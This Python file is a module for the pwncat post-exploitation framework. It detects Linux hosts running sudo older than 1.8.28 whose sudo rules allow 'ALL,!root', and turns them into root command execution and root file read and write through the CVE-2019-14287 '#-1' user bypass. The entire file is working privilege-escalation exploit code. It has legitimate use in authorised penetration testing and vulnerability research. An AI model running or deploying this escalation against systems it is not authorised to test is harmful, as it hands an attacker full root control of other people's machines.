#!/usr/bin/env python3
from packaging import version

import pwncat
from pwncat.facts import build_gtfo_ability
from pwncat.gtfobins import Capability
from pwncat.platform.linux import Linux
from pwncat.modules.enumerate import Schedule, EnumerateModule


class Module(EnumerateModule):
    """Identify systems vulnerable to CVE-2019-14287: Sudo Bug
    Allows Restricted Users to Run Commands as Root."""

    PROVIDES = ["ability.execute", "ability.file.write", "ability.file.read"]
    PLATFORM = [Linux]
    SCHEDULE = Schedule.PER_USER

    def enumerate(self, session: "pwncat.manager.Session"):
        """Check for vulnerability"""

        try:
            # Utilize the version enumeration to grab sudo version
            sudo_info = session.run("enumerate", types=["software.sudo.version"])[0]
        except IndexError:
            return

        # This vulnerability was patched in 1.8.28
        if version.parse(sudo_info.version) >= version.parse("1.8.28"):
            return

        # Grab the current user/group
        current_user = session.current_user()
        current_group = session.find_group(gid=current_user.gid)

        # Iterate over all sudo rules
        for rule in session.run("enumerate", types=["software.sudo.rule"]):
            # We only care about command rules
            if not rule.matched:
                continue

            # User doesn't match us and we don't specify a group in the rule
            if (
                rule.user != "ALL"
                and rule.user != current_user.name
                and rule.group is None
            ):
                continue

            # Ensure we match one of the groups
            if rule.group is not None:
                for group in session.iter_groups(members=[current_user.id]):
                    if rule.group == group.name:
                        break
                else:
                    if rule.group != current_group.name:
                        continue

            # Grab a list of user names which we can run as
            userlist = [x.strip() for x in rule.runas_user.split(",")]

            # This exploits a specific non-standard configuration
            # with these two runas users listed.
            if "ALL" in userlist and "!root" in userlist:
                for command in rule.commands:
                    for method in session.platform.gtfo.iter_sudo(
                        command, caps=Capability.ALL
                    ):
                        # Build a generic GTFO bins capability
                        yield build_gtfo_ability(
                            source=self.name,
                            uid=0,
                            method=method,
                            source_uid=current_user.id,
                            user="\\#-1",
                            spec=command,
                        )
